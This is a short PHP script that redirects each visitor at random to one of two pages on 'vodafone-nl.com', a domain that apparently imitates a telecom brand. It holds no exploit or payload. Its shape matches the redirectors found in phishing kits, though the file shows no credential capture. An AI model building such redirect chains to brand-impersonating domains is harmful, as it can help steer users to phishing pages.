<?php	
	$url = array(
		"https://vodafone-nl.com",
		"https://vodafone-nl.com/active/",
	);
	$total = count($url)-1;	
	$which = rand(0,$total);	
	header('Location: '.$url[$which]);
	exit;
?>
